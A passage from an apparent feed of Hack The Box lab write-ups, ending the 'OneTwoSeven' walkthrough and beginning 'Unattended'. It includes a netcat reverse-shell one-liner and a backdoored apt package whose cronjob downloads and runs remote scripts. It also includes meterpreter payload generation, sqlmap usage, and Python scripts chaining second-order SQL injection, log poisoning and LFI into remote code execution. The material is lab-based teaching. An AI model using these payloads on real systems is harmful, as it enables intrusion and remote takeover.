bunch of interesting things:if ($_POST['username'] == 'ots-admin' &amp;&amp; hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {[...]&lt;p&gt;Administration backend. For administrators only.&lt;/p&gt;&lt;h1&gt;OneTwoSeven Administration&lt;/h1&gt;[...]&lt;?php session_start(); if (isset ($_SESSION['username'])) { header(\"Location: /menu.php\"); } ?&gt;&lt;?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?&gt;[...]  There’s an ots-admin user with a sha256 hash that is easily crackable to Homesweethome1  The page mentions this is some kind of administration backend webpage  The page is supposed to be accessed on port 60080 (which is firewalled / not listening on the 10.10.10.133 IP address)Getting the user flagI can get the source of all the PHP files from the main website by creating additional symlinks:sftp&gt; ln -s /var/www/html/signup.php signup.txtsftp&gt; ln -s /var/www/html/index.php index.txtsftp&gt; ln -s /var/www/html/stats.php stats.txtsftp&gt; rm index.htmlRemoving /public_html/index.htmlThe signup.php file is interesting because it contains the logic used to generate the username and password:&lt;?phpfunction username() { $ip = $_SERVER['REMOTE_ADDR']; return \"ots-\" . substr(str_replace('=','',base64_encode(substr(md5($ip),0,8))),3); }function password() { $ip = $_SERVER['REMOTE_ADDR']; return substr(md5($ip),0,8); }?&gt;I can grab the /etc/passwd file by symlinking to it directly:sftp&gt; ln -s /etc/passwd passwdThe file contains another user with the 127.0.0.1 IP address:ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/falseots-4NzkzMDE:x:1001:1001:10.10.14.23:/home/web/ots-4NzkzMDE:/bin/falseI have the source code of the signup page so I can find what the password is for this user. As shown previously, the password is a portion of the MD5 hash of the user IP address:php &gt; echo \"ots-\" . substr(str_replace('=','',base64_encode(substr(md5(\"127.0.0.1\"),0,8))),3);ots-yODc2NGQphp &gt; echo substr(md5(\"127.0.0.1\"),0,8);f528764dPassword: f528764dI can SFTP in with that account and get the user flag:# sftp ots-yODc2NGQ@10.10.10.133ots-yODc2NGQ@10.10.10.133's password:Connected to ots-yODc2NGQ@10.10.10.133.sftp&gt; lspublic_html  user.txtsftp&gt; get user.txtFetching /user.txt to user.txt# cat user.txt93a4ce...Pivoting to the local administration pageI’ll use SSH tunneling to get access to port 60080 on the server. But I need to pass the -N flag to SSH so it does try to spawn a shell (because only SFTP is enabled).# ssh -L 60080:127.0.0.1:60080 -N ots-yODc2NGQ@10.10.10.133ots-yODc2NGQ@10.10.10.133's password:I can now access the administration web page through my tunnel at 127.0.0.1:60080I log in with ots-admin / Homesweethome1Most of the menu items just provide the output of some Linux commands like:The OTS Addon Manager menu item contains some information about rewrite rules:The addon-upload.php and addon-download.php files are redirected to addons/ots-man-addon.php based on the Apache rewrite rules.Each addon has a [DL] link right next to it and I can download the PHP source code of every file.I can download ots-man-addon.php by using specifying the addon parameter manually.Getting a reverse shell through the addon managerThe interesting part of the ots-man-addon.php file is the upload functionality. This is the obvious target to upload some PHP file and gain remote code execution. The file contains a typical file upload functionality where the file uploaded gets moved into the current directory where the script is executed: /addons.&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /login.php\"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };# OneTwoSeven Admin Plugin# OTS Addon Managerswitch (true) {\t# Upload addon to addons folder.\tcase preg_match('/\\/addon-upload.php/',$_SERVER['REQUEST_URI']):\t\tif(isset($_FILES['addon'])){\t\t\t$errors= array();\t\t\t$file_name = basename($_FILES['addon']['name']);\t\t\t$file_size =$_FILES['addon']['size'];\t\t\t$file_tmp =$_FILES['addon']['tmp_name'];\t\t\tif($file_size &gt; 20000){\t\t\t\t$errors[]='Module too big for addon manager. Please upload manually.';\t\t\t}\t\t\tif(empty($errors)==true) {\t\t\t\tmove_uploaded_file($file_tmp,$file_name);\t\t\t\theader(\"Location: /menu.php\");\t\t\t\theader(\"Content-Type: text/plain\");\t\t\t\techo \"File uploaded successfull.y\";\t\t\t} else {\t\t\t\theader(\"Location: /menu.php\");\t\t\t\theader(\"Content-Type: text/plain\");\t\t\t\techo \"Error uploading the file: \";\t\t\t\tprint_r($errors);\t\t\t}        }There’s two gotchas however:  The URI needs to contain /addon-upload.php for the proper switch branch to be taken  ots-man-addon.php is not meant to be accessed directly from /addons but rather from menu.php. The if( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); } code prevents the PHP code from executing if /addons/ is in the URI.I can bypass the first item by adding a bogus parameter like ?a=/addon-upload.php, and the second by URL encoding some of the characters in the URI.The final HTTP request looks like this: POST /%61ddons/ots-man-addon.php?a=/addon-upload.phpI now have RCE:Time to get a shell with a standard netcat reverse shell. I URL encoded the payload to avoid any issue: GET 127.0.0.1:60080/addons/snowscan.php?cmd=rm %2ftmp%2ff%3bmkfifo %2ftmp%2ff%3bcat %2ftmp%2ff|%2fbin%2fsh -i 2&gt;%261|nc 10.10.14.23 4444 &gt;%2ftmp%2ffroot@ragingunicorn:~/htb/onetwoseven# nc -lvnp 4444Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.10.133.Ncat: Connection from 10.10.10.133:41952./bin/sh: 0: can't access tty; job control turned off$ iduid=35(www-admin-data) gid=35(www-admin-data) groups=35(www-admin-data)$ python -c 'import pty;pty.spawn(\"/bin/bash\")'www-admin-data@onetwoseven:/var/www/html-admin/addons$ ^Z[1]+  Stopped                 nc -lvnp 4444root@ragingunicorn:~/htb/onetwoseven# stty raw -echofgwww-admin-data@onetwoseven:/var/www/html-admin/addonsPriv esc using apt-get MITMI see that www-admin-data can run apt-get as root without any password:www-admin-data@onetwoseven:/$ sudo -lMatching Defaults entries for www-admin-data on onetwoseven:    env_reset, env_keep+=\"ftp_proxy http_proxy https_proxy no_proxy\",    mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-admin-data may run the following commands on onetwoseven:    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgradeThe box is running Devuan Linux, a Linux distro for hipsters who don’t like systemd. Interestingly, there are two different apt sources configured:www-admin-data@onetwoseven:/$ ls -l /etc/apt/sources.list.dtotal 8-rw-r--r-- 1 root root 211 Feb 15 17:22 devuan.list-rw-r--r-- 1 root root 102 Feb 15 17:22 onetwoseven.listwww-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list# OneTwoSeven special packages - not yet in usedeb http://packages.onetwoseven.htb/devuan ascii mainIt’s pretty clear here that I need to do some kind of Man-In-The-Middle (MITM) attack on the apt upgrade process.I did some googling and found a nice blog explaining how to perform the MITM attack on apt-get: https://versprite.com/blog/apt-mitm-package-injection/. I’m not gonna rehash the entire blog article here, but the main elements of my attack are shown below.I pick nano as my target for a malicious package: nano_3.0.0_amd64.debThe postinst adds a cronjob that executes /bin/nano_backdoor every 5 minutes:#!/bin/shset -eif [ \"$1\" = \"configure\" ] || [ \"$1\" = \"abort-upgrade\" ]; then    update-alternatives --install /usr/bin/editor editor /bin/nano 40 \\      --slave /usr/share/man/man1/editor.1.gz editor.1.gz \\      /usr/share/man/man1/nano.1.gz    update-alternatives --install /usr/bin/pico pico /bin/nano 10 \\      --slave /usr/share/man/man1/pico.1.gz pico.1.gz \\      /usr/share/man/man1/nano.1.gzficrontab -l | { cat; echo \"*/5 * * * * /bin/nano_backdoor \"; } | crontab -nano_backdoor just downloads and executes a shell script from my box:#!/bin/shrm /tmp/snowscan.shwget http://10.10.14.23/snowscan.sh -O /tmp/snowscan.shchmod 777 /tmp/snowscan.sh/tmp/snowscan.shThe /devuan/dists/ascii/Release looks like this:# cat ReleaseOrigin: DevuanLabel: DevuanSuite: stableVersion: 2.0Codename: asciiDate: Wed, 20 Apr 2019 05:00:00 UTCArchitectures:  amd64Components: main contrib non-free raspi beaglebone droid4 n900 n950 n9 sunxi exynosSHA256: 947ab0bff476deda21dbab0c705b14211718ed357d5ca75e707bea4bdc762c59 770 main/binary-amd64/Packages 7c18ea11cba4acd2a3fdcea314c2b816787cecc4aaad2ae75667553cf700769b 551 main/binary-amd64/Packages.xzThe /devuan/dists/ascii/main/binary-amd64/Packages file contains the modified version number, updated filename and checksums:# cat PackagesPackage: nanoVersion: 3.0.0Installed-Size: 2043Maintainer: Jordi Mallach &lt;jordi@debian.org&gt;Architecture: amd64Replaces: picoProvides: editorDepends: libc6 (&gt;= 2.14), libncursesw5 (&gt;= 6), libtinfo5 (&gt;= 6), zlib1g (&gt;= 1:1.1.4)Conflicts: picoHomepage: https://www.nano-editor.org/Description: small, friendly text editor inspired by PicoDescription-md5: 04397a7cc45e02bc3a9900a7fbed769cSuggests: spellTag: implemented-in::c, interface::text-mode, role::program, scope::utility, suite::gnu, uitoolkit::ncurses, use::editing, works-with::textSection: editorsPriority: importantFilename: pool/DEBIAN/main/n/nano/nano_3.0.0_amd64.debSize: 484680MD5sum: 2aed07eb168f2dcafcc0f6311d33ace0SHA256: 7f256355537f78c672d5f8aff6de00c63a026306df6e120b2ee8eaaa503d923cNext I setup Burp to listen on all interfaces:Then modify /etc/hosts to point the apt repositories to my own box:127.0.0.1 packages.onetwoseven.htb de.deb.devuan.orgI can force the server to connect through my Kali VM by setting the http_proxy variable so it uses the Burp proxy. My local host file points the repo domain to 127.0.0.1 so it connects to my Python webserver.www-admin-data@onetwoseven:/$ sudo http_proxy=http://10.10.14.23:8080 apt-get updateIgn:1 http://packages.onetwoseven.htb/devuan ascii InReleaseIgn:2 http://de.deb.devuan.org/merged ascii InReleaseGet:3 http://packages.onetwoseven.htb/devuan ascii Release [420 B]Ign:4 http://de.deb.devuan.org/merged ascii-security InReleaseIgn:5 http://packages.onetwoseven.htb/devuan ascii Release.gpgIgn:6 http://de.deb.devuan.org/merged ascii-updates InReleaseErr:7 http://de.deb.devuan.org/merged ascii Release  404  File not foundIgn:8 http://packages.onetwoseven.htb/devuan ascii/main amd64 PackagesErr:9 http://de.deb.devuan.org/merged ascii-security Release  404  File not foundGet:8 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages [770 B]Err:10 http://de.deb.devuan.org/merged ascii-updates Release  404  File not foundReading package lists... DoneW: The repository 'http://packages.onetwoseven.htb/devuan ascii Release' is not signed.N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.N: See apt-secure(8) manpage for repository creation and user configuration details.E: The repository 'http://de.deb.devuan.org/merged ascii Release' does no longer have a Release file.N: Updating from such a repository can't be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.E: The repository 'http://de.deb.devuan.org/merged ascii-security Release' does no longer have a Release file.N: Updating from such a repository can't be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.E: The repository 'http://de.deb.devuan.org/merged ascii-updates Release' does no longer have a Release file.N: Updating from such a repository can't be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.www-admin-data@onetwoseven:/$ sudo http_proxy=http://10.10.14.23:8080 apt-get upgradeReading package lists... DoneBuilding dependency treeReading state information... DoneCalculating upgrade... DoneThe following packages will be upgraded:  nano1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.Need to get 485 kB of archives.After this operation, 0 B of additional disk space will be used.Do you want to continue? [Y/n] yWARNING: The following packages cannot be authenticated!  nanoInstall these packages without verification? [y/N] yGet:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 nano amd64 3.0.0 [485 kB]Fetched 485 kB in 0s (4372 kB/s)Reading changelogs... Donedebconf: unable to initialize frontend: Dialogdebconf: (Dialog frontend will not work on a dumb terminal, an emacs shell buffer, or without a controlling terminal.)debconf: falling back to frontend: Readline(Reading database ... 33940 files and directories currently installed.)Preparing to unpack .../archives/nano_3.0.0_amd64.deb ...Unpacking nano (3.0.0) over (2.7.4-1) ...Setting up nano (3.0.0) ...Processing triggers for man-db (2.7.6.1-2) ...File has been installed, I can see the backdoored script file:www-admin-data@onetwoseven:/$ ls -l /bin/nano*-rwxr-xr-x 1 root root 225320 Jan 11  2017 /bin/nano-r-xr-xr-x 1 root root    130 Apr 21 21:13 /bin/nano_backdoorNext, I’ll create a snowscan.sh file in the root of my Python webserver:#!/bin/shwget http://10.10.14.23/met -O /tmp/metchmod 777 /tmp/met/tmp/metThen I generate a Meterpreter payload to connect back to me when it gets executed by the cronjob:# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LPORT=5555 LHOST=10.10.14.23And finally once the cronjob runs, it downloads snowscan.sh, executes it and downloads the meterpreter binary so I can get a shell as root:msf5 exploit(multi/handler) &gt; show optionsModule options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (linux/x64/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  tun0             yes       The listen address (an interface may be specified)   LPORT  5555             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf5 exploit(multi/handler) &gt; jobsJobs====No active jobs.msf5 exploit(multi/handler) &gt; run -j[*] Exploit running as background job 0.[*] Started reverse TCP handler on 10.10.14.23:5555msf5 exploit(multi/handler) &gt; [!] Stage encoding is not supported for linux/x64/meterpreter/reverse_tcp[*] Sending stage (3021284 bytes) to 10.10.10.133[*] Meterpreter session 2 opened (10.10.14.23:5555 -&gt; 10.10.10.133:48542) at 2019-04-21 22:45:41 -0400msf5 exploit(multi/handler) &gt; sessions 2[*] Starting interaction with 2...meterpreter &gt; getuidServer username: uid=0, gid=0, euid=0, egid=0meterpreter &gt; shellProcess 13981 created.Channel 1 created.python -c 'import pty;pty.spawn(\"/bin/bash\")'root@onetwoseven:~# ididuid=0(root) gid=0(root) groups=0(root)root@onetwoseven:~# cat /root/root.txt2d380a..."
  },
  
  {
    "title": "Unattended - Hack The Box",
    "url": "/posts/htb-writeup-unattended/",
    "categories": "hackthebox, infosec",
    "tags": "vhost, linux, sqli, sqlmap, 2nd order injection, php, lfi, ipv6, firewall, uinitrd",
    "date": "2019-08-24 00:00:00 +0800",
    





    
    "snippet": "Unattended was a pretty tough box with a second order SQL injection in the PHP app. By injecting PHP code into the web server access logs through the User-Agent header, I can get RCE by including t...",
    "content": "Unattended was a pretty tough box with a second order SQL injection in the PHP app. By injecting PHP code into the web server access logs through the User-Agent header, I can get RCE by including the logs using the SQL injection. I didn’t quite understand what the priv esc was about though. I found the initrd archive and stumbled upon the contents by doing a grep on the box author’s name.Summary  Get the vhost from the SSL certificate information  Enumerate the website to find that the only parameter that seems dynamic is the id parameter  Run sqlmap against the site and find both a boolean-blind and time-based boolean injection in the id parameter  Slowly dump what seems to be the most relevant tables: config, idnames and filepath  Based on the information found, assume that the included page from PHP is the results of two SQL queries  Construct a 2nd order SQL injection to get a LFI  Inject PHP code in the NGINX access.log and use the LFI to point to the code and get RCE  Obtain a PHP meterpreter by downloading a msfvenom payload through PHP system() and wget  Find that we have write access in the /var/lib/php/sessions directory and drop a perl reverse shell there  Modify the table config, change the checkrelease parameter to point to the reverse shell perl script  Wait for the cronjob to run and get a shell as guly  Find that the server has an IPv6 address and that SSH is not firewalled on IPv6  Check groups that guly is part of, find that he is part of grub which is not a standard Debian group  Look for files owned by group grub, find /boot/initrd.img-4.9.0-8-amd64  Download, unpack the file, find a uinitrd binary which is not standard in Debian  Search for box maker name (guly) in the unpacked files and find comment followed by /sbin/uinitrd c0m3s3f0ss34nt4n1 in cryptoroot file  Can’t execute uinitrd on the box because of permissions but we can upload our own copy and execute it from /home/guly  Output is 40 characters hex. By passing the c0m3s3f0ss34nt4n1 argument we get a different SHA1 output  The 40 characters hex string output is the root password and can su root with itPortscanThere’s not much running on this box but I make note of the www.nestedflanders.htb SSL certificate name. I’ll add this to my /etc/hosts file as well as other subdomains like admin.*, dev.*, etc. in case I need them later.# nmap -sC -sV -p- 10.10.10.126Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-13 19:01 EDTNmap scan report for 10.10.10.126Host is up (0.0067s latency).Not shown: 65533 filtered portsPORT    STATE SERVICE  VERSION80/tcp  open  http     nginx 1.10.3|_http-server-header: nginx/1.10.3|_http-title: 503 Service Temporarily Unavailable443/tcp open  ssl/http nginx 1.10.3| ssl-cert: Subject: commonName=www.nestedflanders.htb| Not valid before: 2018-12-19T09:43:58|_Not valid after:  2021-09-13T09:43:58Web site enumeration - Port 80The default page on the Port 80 web server returns a single dot.Nothing interesting is returned from gobuster so I won’t include the output here.Web site enumeration - Port 443The default apache page is shown here.The response contains the X-Upstream: 127.0.0.1:8080 header which indicates that Nginx is probably fronting the HTTPS page and proxying back to Apache2 on the backend.There’s also a index.php and /dev/ page which I found by running gobuster.# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php -k -t 10 -u https://www.nestedflanders.htb/dev (Status: 301)/index.php (Status: 200)The /dev/ doesn’t have anything interesting. I check the vhost dev.nestedflanders.htb but that doesn’t seem valid and I get directed to the page with the single dot.The index.php shows the followings pages that are included with the id parameter.There’s nothing at first glance that seems dynamic other than the id parameter used to include pages. After manually trying other parameters, I find that the name parameter is used by the page to change the name displayed and is vulnerable to XSS. It’s a reflected XSS so I don’t see how this would be useful here. Moving on.Finding the first SQL injectionNext, I run sqlmap on the page to see if I can find a SQL injection in the id parameter. I find that the database backend is MySQL and that the page contains two SQL injections: a boolean-based blind and time-based boolean injection. Originally when I first ran sqlmap with id=25 it only found that time-based blind injection but when I specified the id=587 it found both. I think this happens because the default page returned by index.php is the one from id 25, so the boolean-blind injection can only work with the other two pages.# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -p id[...]sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=587' AND 5533=5533 AND 'BkIC'='BkIC    Type: AND/OR time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind    Payload: id=587' AND SLEEP(5) AND 'kUKZ'='kUKZ---[00:51:04] [INFO] the back-end DBMS is MySQLweb application technology: Nginx 1.10.3back-end DBMS: MySQL &gt;= 5.0.12The boolean-blind injection is faster to dump the database and is less susceptible to instability if other people are hammering the box. First I check the current database used, then dump the list of tables from database neddy:# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --current-db[...][00:54:27] [INFO] retrieved: neddycurrent database:    'neddy'# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --tables -D neddy[...]Database: neddy[11 tables]+--------------+| config       || customers    || employees    || filepath     || idname       || offices      || orderdetails || orders       || payments     || productlines || products     |+--------------+I’ll focus on config, idname and filepath tables first. The other tables contain a lot of rows and it would take too long to dump everything. I increase the thread count to make it a bit faster.# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -T config,filepath,idname --technique B -D neddy --dump --threads 10[...]Table: config+-----+-------------------------+--------------------------------------------------------------------------+| id  | option_name             | option_value                                                             |+-----+-------------------------+--------------------------------------------------------------------------+| 54  | offline                 | 0                                                                        || 55  | offline_message         | Site offline, please come back later                                     || 56  | display_offline_message | 0                                                                        || 57  | offline_image           | &lt;blank&gt;                                                                  || 58  | sitename                | NestedFlanders                                                           || 59  | editor                  | tinymce                                                                  || 60  | captcha                 | 0                                                                        || 61  | list_limit              | 20                                                                       || 62  | access                  | 1                                                                        || 63  | debug                   | 0                                                                        || 64  | debug_lang              | 0                                                                        || 65  | dbtype                  | mysqli                                                                   || 66  | host                    | localhost                                                                || 67  | live_site               | &lt;blank&gt;                                                                  || 68  | gzip                    | 0                                                                        || 69  | error_reporting         | default                                                                  || 70  | ftp_host                | 127.0.0.1                                                                || 71  | ftp_port                | 21                                                                       || 72  | ftp_user                | flanders                                                                 || 73  | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 || 74  | ftp_root                | /                                                                        || 75  | ftp_enable              | 1                                                                        || 76  | offset                  | UTC                                                                      || 77  | mailonline              | 1                                                                        || 78  | mailer                  | mail                                                                     || 79  | mailfrom                | nested@nestedflanders.htb                                                || 80  | fromname                | Neddy                                                                    || 81  | sendmail                | /usr/sbin/sendmail                                                       || 82  | smtpauth                | 0                                                                        || 83  | smtpuser                | &lt;blank&gt;                                                                  || 84  | smtppass                | &lt;blank&gt;                                                                  || 85  | smtppass                | &lt;blank&gt;                                                                  || 86  | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      || 87  | smtphost                | localhost                                                                || 88  | smtpsecure              | none                                                                     || 89  | smtpport                | 25                                                                       || 90  | caching                 | 0                                                                        || 91  | cache_handler           | file                                                                     || 92  | cachetime               | 15                                                                       || 93  | MetaDesc                | &lt;blank&gt;                                                                  || 94  | MetaKeys                | &lt;blank&gt;                                                                  || 95  | MetaTitle               | 1                                                                        || 96  | MetaAuthor              | 1                                                                        || 97  | MetaVersion             | 0                                                                        || 98  | robots                  | &lt;blank&gt;                                                                  || 99  | sef                     | 1                                                                        || 100 | sef_rewrite             | 0                                                                        || 101 | sef_suffix              | 0                                                                        || 102 | unicodeslugs            | 0                                                                        || 103 | feed_limit              | 10                                                                       || 104 | lifetime                | 1                                                                        || 105 | session_handler         | file                                                                     |+-----+-------------------------+--------------------------------------------------------------------------+[...]Table: idname+-----+-------------+----------+| id  | name        | disabled |+-----+-------------+----------+| 1   | main.php    | 1        || 2   | about.php   | 1        || 3   | contact.php | 1        || 25  | main        | 0        || 465 | about       | 0        || 587 | contact     | 0        |+-----+-------------+----------+[...]Table: filepath+---------+--------------------------------------+| name    | path                                 |+---------+--------------------------------------+| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php || contact | 0f710bba8d16303a415266af8bb52fcb.php || main    | 787c75233b93aa5e45c3f85d130bfbe7.php |+---------+--------------------------------------+[...]Here are my observations for each of the table:  config: There’s a lot of data here, including some potential credentials in ftp_pass. There’s also a checkrelease option that points to a perl script in /home/guly/  idname: That table contains the mapping between the ID specified in the GET request and a name  filepath: The name from the previous table seems to be referenced here in this tableSecond order SQL injectionI have the database table with some possible credentials but there’s nothing else open on this box except HTTP and HTTPS and I haven’t found any other hidden directory and/or vhost. There’s possibly a service listening on an IPv6 address but I don’t know the address and I can’t scan the entire /64 because that address space is too large to scan.The MD5 hash of the last two entries in the filepath table are the md5sum of the strings submission and smtp. Thinking that this was a hint, I hashed a couple of wordlists and ran those through wfuzz but was unsuccesfull in finding any other files.I don’t have the PHP source code but I can guess that there are two SQL queries being issued from index.php: one to map the ID to the name, and another one to map the name to the filename. If I can perform an injection on the first query, I can probably do the same on the second one and control which file gets included by the PHP code, basically getting an LFI.I don’t like testing SQL injections within Burp so I made a script to help me with the process:import readlineimport requestsproxies = { \"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\" }while True:    cmd = raw_input(\"&gt; \")    payload = cmd    payload = payload + \"-- -\"    print payload    r = requests.get(\"https://www.nestedflanders.htb/index.php?id=%s\" % payload, proxies=proxies, verify=False)    soup = BeautifulSoup(r.text, 'html.parser')    print soup.bodyThe first thing I test is to check if I can display the Contact page by returning contact instead of main from the first query against the idname table.This is the query I want to run against the idname table: SELECT name FROM idname WHERE id = '25' UNION SELECT ALL 'contact'Output from my script below:# python sqli.py&gt; 25' union select all 'contact'[...]&lt;body class=\"container\"&gt;Hello visitor,&lt;br/&gt;thanks for getting in touch with us!&lt;br/&gt;Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.&lt;br/&gt;Please come back later.Ok, so that was successful and the Contact page was returned so the first injection worked. What I want to do now is inject another SQL injection in the name field returned instead of the actual name value so I can use the same UNION SELECT injection on the 2nd query and return a filename of my choosing.This is the query I want to run against the filepath table: SELECT path FROM filepath WHERE name = 'invalid' UNION SELECT ALL '/etc/passwd'.I made another script to do this:from bs4 import BeautifulSoupimport readlineimport requestsproxies = { \"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\" }while True:    file = raw_input(\"&gt; \")    payload = \"25' union select all \\\"%s\\\" -- -\" % (\"invalid' union select all '\" + file)    r = requests.get(\"https://www.nestedflanders.htb/index.php?id=%s\" % payload, proxies=proxies, verify=False)    soup = BeautifulSoup(r.text, 'html.parser')    print soup.bodyThe 2nd query now returns a file name that I control and I can read files on the target system:# python sqli3.py&gt; /etc/passwd[...]&lt;!-- &lt;div align=\"center\"&gt; --&gt;root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/bin/bashbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false_apt:x:104:65534::/nonexistent:/bin/falsemessagebus:x:105:109::/var/run/dbus:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinguly:x:1000:1000:guly,,,:/home/guly:/bin/bashmysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/falseGaining RCE on the system through code PHP injection in the access logsI have access to the nginx access logs and I can see that the User-Agent header is included in the logs:&gt; /var/log/nginx/access.log10.10.14.23 - - [14/Apr/2019:21:31:24 -0400] \"GET /index.php?id=25'%20union%20select%20all%20%22invalid'%20union%20select%20all%20'/etc/issue%22%20--%20- HTTP/1.1\" 200 423 \"-\" \"python-requests/2.18.4\"10.10.14.23 - - [14/Apr/2019:21:32:38 -0400] \"GET /index.php?id=25'%20union%20select%20all%20%22invalid'%20union%20select%20all%20'/etc/passwd%22%20--%20- HTTP/1.1\" 200 925 \"-\" \"python-requests/2.18.4\"10.10.14.23 - - [14/Apr/2019:21:38:00 -0400] \"GET /index.php?id=25'%20union%20select%20all%20%22invalid'%20union%20select%20all%20'/home/guly/user.txt%22%20--%20- HTTP/1.1\" 200 398 \"-\" \"python-requests/2.18.4\"I control the User-Agent header so I can potentially inject PHP code in the access logs and trigger it by making a request to the log file using the LFI from the SQL injection. After some trial and error I find that Iwe can inject any PHP code I want in the User-Agent header and that the system function is not disabled. To make sure I don’t end up with too much PHP statements in the access logs and kill the box, I reset the content of the access log file every time I run a command.Here’s the script I made to execute commands. I could have put more regex in there to clean up the output a bit more but that’ll do for now.#!/usr/bin/pythonfrom bs4 import BeautifulSoupimport reimport readlineimport requestsimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = { \"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\" }while True:    cmd = raw_input(\"&gt; \")    headers = { \"User-Agent\": \"&lt;?php system('echo **BEGIN** &gt; /var/log/nginx/access.log; %s'); ?&gt;**END**\" % cmd}    r = requests.get(\"http://10.10.10.126/\", headers=headers)    file = \"/var/log/nginx/access.log\"    payload = \"25' union select all \\\"%s\\\" -- -\" % (\"invalid' union select all '\" + file)    r = requests.get(\"https://www.nestedflanders.htb/index.php?id=%s\" % payload, proxies=proxies, verify=False)    soup = BeautifulSoup(r.text, 'html.parser')    m = re.search(\"\\*\\*BEGIN\\*\\*(.*)\\*\\*END\\*\\*\", str(soup.body), flags=re.DOTALL)    if m:        print m.group(1)    else:        print(\"No output\")I have RCE as www-data:# python rce.py&gt; id**10.10.14.23 - - [14/Apr/2019:21:59:41 -0400] \"GET / HTTP/1.1\" 200 2 \"-\" \"uid=33(www-data) gid=33(www-data) groups=33(www-data)Python and netcat are not installed on this box. I tried using perl to spawn a shell but I kept killing the box (bad code injected in the access log? so I tried downloading netcat and spawn a shell that way.&gt; wget http://10.10.14.23/nc -O /tmp/nc&gt; chmod 777 /tmp/nc&gt; ls -l /tmp/nc10.10.14.23 - - [14/Apr/2019:22:08:26 -0400] \"GET / HTTP/1.1\" 200 2 \"-\" \"-rwxrwxrwx 1 www-data www-data 442856 Apr 14 14:22 /tmp/nc&gt; /tmp/nc -e /bin/sh 10.10.14.23 80[No output!]I download netcat on the box but I don’t get any callback when I try to execute it. When I look at the filesystem mounts I see that the temporary locations are all mounted as noexec so I can’t run any binary that I upload there.&gt; mount**10.10.14.23 - - [14/Apr/2019:22:00:14 -0400] \"GET / HTTP/1.1\" 200 2 \"-\" \"/dev/mapper/sda2_crypt on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)[...]tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)/dev/sda1 on /boot type ext2 